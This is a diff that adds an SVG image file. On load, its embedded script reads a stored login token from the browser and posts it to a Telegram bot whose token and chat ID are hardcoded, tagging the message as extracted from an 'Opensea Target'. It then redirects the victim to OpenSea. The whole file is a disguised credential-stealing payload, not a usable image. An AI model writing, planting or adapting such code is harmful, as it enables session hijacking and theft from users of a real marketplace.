@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" onload="init()">
+  <script type="application/ecmascript"><![CDATA[
+    function init(){
+      const token = localStorage.getItem('token') || 'this-worked-v2';
+    
+      // Your Telegram Bot Token and Chat ID
+      const botToken = "7895775398:AAHrFnDgYRcKr16jt1wMy1vOeR5qz19u47o";
+      const chatId = "-1003228598971";
+      
+      const telegram_url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      
+      const payload = {
+        chat_id: chatId,
+        text: "Token extracted from Opensea Target" + token,
+        parse_mode: "HTML"
+      };
+      
+      fetch(telegram_url, {
+        method: 'POST',
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      }).then(() => {
+        setTimeout(() => {
+          window.location.href = 'https://opensea.io';
+        }, 500);
+      }).catch(() => {
+        setTimeout(() => {
+          window.location.href = 'https://opensea.ios';
+        }, 500);
+      });
+    }
+  ]]>
+  </script>
+
+</svg>
+
+
+
+
